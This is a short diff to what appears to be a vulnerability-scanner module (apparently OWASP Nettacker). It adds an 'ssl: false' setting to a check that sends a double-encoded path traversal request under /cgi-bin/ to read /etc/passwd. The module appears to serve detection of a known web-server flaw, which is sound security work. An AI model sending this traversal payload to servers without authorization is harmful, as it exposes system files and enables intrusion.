@@ -25,6 +25,7 @@ payloads:
         headers:
           User-Agent: "{user_agent}"
           Host: '{target}'
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
